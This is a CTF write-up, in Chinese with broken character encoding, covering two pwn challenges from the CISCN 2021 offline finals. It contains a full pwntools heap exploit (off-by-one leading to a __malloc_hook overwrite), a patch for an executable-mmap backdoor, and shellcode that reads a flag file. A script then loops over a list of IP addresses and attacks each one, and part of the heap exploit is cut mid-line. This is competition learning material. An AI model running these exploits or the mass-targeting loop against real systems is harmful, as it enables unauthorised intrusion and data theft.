# ciscn2021 åä¸­çº¿ä¸‹èµ›pwnéƒ¨åˆ†é¢˜è§£
##### è¯‘æ–‡å£°æ˜
æœ¬æ–‡æ˜¯ç¿»è¯‘æ–‡ç« 
è¯‘æ–‡ä»…ä¾›å‚è€ƒï¼Œå…·ä½“å†…å®¹è¡¨è¾¾ä»¥åŠå«ä¹‰åŸæ–‡ä¸ºå‡†ã€‚
## å‰è¨€
èœé¸¡ç¬¬ä¸€æ¬¡æ‰“çº¿ä¸‹èµ›ï¼Œä¸€å¤©è§£é¢˜ä¸€å¤©awdï¼Œä¸€å…±å››ä¸ªpwnï¼Œè§£é¢˜èµ›çš„pwn2åˆ°æœ€åéƒ½åªæœ‰ä¸€ä¸ªå¸ˆå‚…æå®šï¼ˆå‡Œéœ„çš„å¸ˆå‚…tqlï¼‰ï¼Œæœ¬èœé¸¡åªå‡ºäº†ä¸¤ä¸ªé¢˜ï¼Œä¸è¿‡è¿˜å¥½ç°åœºawdä¸æ˜¯å¾ˆæ¿€çƒˆï¼Œåªé ä¸€ä¸ªä¹Ÿå‹‰å¼ºæ´»äº†ä¸‹æ¥ã€‚æœ¬æ–‡ç®€å•è®°å½•ä¸€ä¸‹è§£é¢˜çš„pwn1å’Œawdçš„æ°´pwnã€‚
## pwn1
è§£é¢˜èµ›ä¸€å…±ä¸¤ä¸ªpwné¢˜ï¼Œè¿˜å¥½é˜Ÿä¼é‡Œå…¶ä»–å¤§ä½¬cæˆ‘ã€‚
###  æ¼æ´ç‚¹
pwn1å°±æ˜¯ä¸€é“æœ´å®æ— åçš„å †é¢˜ï¼Œ2.31çš„libcï¼Œåœ¨ç”³è¯·å †å—è¾“å…¥å†…å®¹çš„æ—¶å€™å­˜åœ¨off by oneã€‚
     for ( i = 0; i 0x68 2->0xe8 else 0x21
    sh = process('./note')
    #sh = remote('10.12.153.11',58011)
    libc = ELF('/opt/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so')
    for i in range(7):#calloc(0xe8) fill tcache
        add(2)
        delete(0)
    add(2,'\x00'*0x80)#0
    add(1,'a'*0x20+p64(0xb0)+p64(0x70-0x30))#1  fake pre_sz & sz
    delete(0)#ustbin
    add(1,'\x00'*0x68+p64(0xb1))#0 off by one
    for i in range(4):
        add(0)
        delete(2)
    show(1)
    libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00'))-(0x7efc8cb1dbe0-0x7efc8c932000)
    print hex(libc_base)
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    delete(0)
    for i in range(6):
        add(1)
        delete(0)
    add(2)#0
    delete(1)#0x30 tcache
    add(1,'a'*0x60+p64(0xf0))#1
    add(2)#2
    delete(0)#unsorted bin
    delete(1)# 0x71 fastbin
    add(1,'a'*0x60+p64(0xf0)+p64(0xf0))#0 fake size
    add(1,'\x00'*0x68+p64(0xf1))#1
    delete(0)
    add(2,'\x00'*0x70+p64(0)+p64(0x70)+p64(malloc_hook-0x33)+'\x00'*(0xe8-0x88)+p64(0X51))#0
    delete(2)
    delete(1)
    add(1,'a'*0x68+p64(0x81))
    delete(0)
    add(1)
    add(1,'a'*0x23+p64(libc_base+0xe6c7e))
    delete(0)
    sla('choice:','1')
    #gdb.attach(sh)
    sla('Large.',str(3))
    ti()
## pwn1_awd
æ¯”è¾ƒç®€å•çš„ä¸€é¢˜ï¼Œä¸è¿‡awdé˜¶æ®µé è¿™é¢˜è¿˜æ‹¿äº†ä¸å°‘åˆ†ï¼ŒæŒºç¦»è°±çš„ã€‚
###  æ¼æ´ç‚¹
æœ‰ä¸€ä¸¢ä¸¢é€†å‘pwnçš„æ„æ€ï¼Œä¸è¿‡é€»è¾‘å¾ˆç®€æ´ã€‚  
è¾“å…¥æ ¼å¼
    op : choice é€‰æ“ä½œ
    + ï¼šoff è¾“å…¥åç§»
    n : size è¾“å…¥é•¿åº¦
æ“ä½œ2å’Œ3éƒ½æ˜¯å…ˆè°ƒç”¨mmapå¼€è¾Ÿä¸€å—å†…å­˜ç©ºé—´ï¼Œç„¶åä»¥offä¸ºåç§»ï¼Œsizeä¸ºå¤§å°å†™å…¥å†…å®¹ã€‚  
å…·æœ‰å¯æ‰§è¡Œæƒé™ã€‚
    unsigned __int64 sub_400A65()
    {
      unsigned int v0; // eax
      unsigned __int64 v2; // [rsp+8h] [rbp-8h]
      v2 = __readfsqword(0x28u);
      if ( !mmap_addr )
      {
        v0 = getpagesize();
        mmap_addr = (int)mmap((void *)0x1000, v0, 7, 34, 0, 0LL);
      }
      return __readfsqword(0x28u) ^ v2;
    }
é€‰é¡¹1åˆ¤æ–­å¼€è¾Ÿçš„å†…å­˜ç©ºé—´å†…å®¹æ˜¯å¦ä¸º`0xdeadbeef`ï¼Œæ˜¯åˆ™getshellã€‚  
ä½†æ˜¯å½“æ—¶å°±å¾ˆå¥‡æ€ªï¼Œè¿™ä¸ªshellè¯»ä¸äº†æ ¹ç›®å½•ä¸‹çš„flagæ–‡ä»¶ï¼Œå¯èƒ½è·Ÿæƒé™æœ‰å…³ç³»ã€‚
    unsigned __int64 sub_400AD4()
    {
      unsigned __int64 v1; // [rsp+8h] [rbp-8h]
      v1 = __readfsqword(0x28u);
      puts("ready?");
      mmap_to_write();
      if ( *(_DWORD *)mmap_addr == 0xDEADBEEF )
        system("/bin/sh");
      puts("oh?");
      return __readfsqword(0x28u) ^ v1;
    }
é€‰é¡¹4å°±å¾ˆç›´ç™½ã€‚
    unsigned __int64 sub_400C92()
    {
      unsigned __int64 v1; // [rsp+8h] [rbp-8h]
      v1 = __readfsqword(0x28u);
      mmap_to_write();
      puts("ready?");
      mmap_addr("ready?")//æ‰§è¡Œshellcode
      return __readfsqword(0x28u) ^ v1;
    }
###  ä¿®å¤
ä¸€ä¸ªæ˜¯mmapå‡ºçš„å†…å­˜ç©ºé—´ä¸å¯æ‰§è¡Œã€‚ å†å°†åé—¨patchæ‰ï¼Œä¸è¿‡åé—¨ä¸ä¿®åº”è¯¥ä¹Ÿæ²¡å…³ç³»ï¼Œåæ­£è¯»ä¸åˆ°flagã€‚
    mmap_addr = (__int64 (__fastcall *)(_QWORD))(int)mmap((void *)0x1000, v0, 6, 34, 0, 0LL);
###  exp
    from pwn import *
    from LibcSearcher import *
    context.log_level = 'debug'
    sa = lambda s,n : sh.sendafter(s,n)
    sla = lambda s,n : sh.sendlineafter(s,n)
    sl = lambda s : sh.sendline(s)
    sd = lambda s : sh.send(s)
    rc = lambda n : sh.recv(n)
    ru = lambda s : sh.recvuntil(s)
    ti = lambda : sh.interactive()
    context.arch = 'amd64'
    shellcode = shellcraft.open('flag.txt')
    shellcode += shellcraft.read('rax','rsp',0x60)
    shellcode += shellcraft.write(1,'rsp',0x60)
    payload = asm(shellcode)
    #sh = remote('10.12.153.18',9999)
    def write_shell():
        return 'op:2\n+:0\nn:400\n\n'
    def run():
        return 'op:4\n\n'
    #gdb.attach(sh)
    def pwn():
        sla('code> ',write_shell())
        sa('ready?',payload)
        sla('code> ',run())
    #run_shell(sh,'./backdoor')
    with open('ip.txt','r') as f:
        ips = f.readlines()
    print ips
    f = open('flag_2.txt','w+')
    for i in ips:
        ip= i.strip('\r\n')
        print ip
        sh = remote(ip,9999)
        try:
            pwn()
            flag = ru('}')[-38:]
            f.write(flag+'\n')
            print '__flag__:'+flag
        except:
            print 'error'
    f.close()
## æ€»ç»“
è§£é¢˜èµ›è¢«pwn2æ”¯é…äº†å¤§åŠå¤©ï¼Œç»“æœè¿˜æ˜¯æ²¡ä»€ä¹ˆè¿›å±•ï¼ŒğŸ˜”å¤ªèœäº†ã€‚å¬è¯´ç°åœºçš„å”¯ä¸€è§£æ˜¯ha1vkï¼Œå¤§ä½¬tqlã€‚awdå°±æŠŠpwn2æ´ä¿®äº†ç„¶åä¹Ÿæ²¡å†çœ‹ï¼Œè¢«webä½¬cäº†ã€‚